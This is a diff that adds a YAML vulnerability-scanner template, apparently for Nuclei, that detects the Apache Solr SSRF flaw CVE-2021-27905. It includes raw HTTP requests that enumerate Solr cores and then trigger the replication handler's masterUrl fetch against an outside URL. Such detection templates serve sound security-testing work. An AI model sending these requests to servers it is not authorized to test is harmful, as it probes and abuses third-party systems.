@@ -1,0 +1,49 @@
+id: CVE-2021-27905
+
+info:
+  name: Apache Solr <=8.8.1 - Server-Side Request Forgery
+  author: hackergautam
+  severity: critical
+  description: Apache Solr versions 8.8.1 and prior contain a server-side request forgery vulnerability. The ReplicationHandler (normally registered at "/replication" under a Solr core) in Apache Solr has a "masterUrl" (also "leaderUrl" alias) parameter that is used to designate another ReplicationHandler on another Solr core to replicate index data into the local core. To prevent a SSRF vulnerability, Solr ought to check these parameters against a similar configuration it uses for the "shards" parameter.
+  reference:
+    - https://www.anquanke.com/post/id/238201
+    - https://ubuntu.com/security/CVE-2021-27905
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-27905
+    - https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/
+  remediation: This issue is resolved in Apache Solr 8.8.2 and later.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2021-27905
+    cwe-id: CWE-918
+  tags: cve,cve2021,apache,solr,ssrf
+
+requests:
+  - raw:
+      - |
+        GET /solr/admin/cores?wt=json HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en
+        Connection: close
+
+      - |
+        GET /solr/{{core}}/replication/?command=fetchindex&masterUrl=https://example.com HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en
+        Connection: close
+
+    extractors:
+      - type: regex
+        internal: true
+        name: core
+        group: 1
+        regex:
+          - '"name"\:"(.*?)"'
+
+    matchers:
+      - type: word
+        words:
+          - '<str name="status">OK</str>'
+        part: body
+
+# Enhanced by mp on 2022/05/17
